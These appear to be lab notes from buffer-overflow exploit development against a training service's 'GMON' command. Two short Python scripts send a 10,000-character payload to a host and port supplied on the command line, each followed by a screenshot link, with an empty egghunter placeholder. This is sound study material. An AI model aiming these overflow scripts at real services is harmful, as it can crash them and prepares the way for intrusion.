## Initial payload

- Code

```
#!/usr/bin/python

import socket
import os
import sys
from struct import pack


host = sys.argv[1]
port = int(sys.argv[2])
egghunter = b""

buffer =  b"GMON "
buffer += b"./"*10000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print (s.recv(1024))
s.send(buffer)
print (s.recv(1024))
s.close()
```

- Screenshot

![4b749a6b29b95f05cfd940b537976ac8.png](../_resources/4b749a6b29b95f05cfd940b537976ac8-1.png)

## Update Payload 00

- Code

```
#!/usr/bin/python

import socket
import os
import sys
from struct import pack

host = sys.argv[1]
port = int(sys.argv[2])
egghunter = b""

buffer =  b"GMON "
buffer += b"./"+b"A"*10000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print (s.recv(1024))
s.send(buffer)
print (s.recv(1024))
s.close()
```

- Screenshot

![221111.00.png](../_resources/221111.00.png)

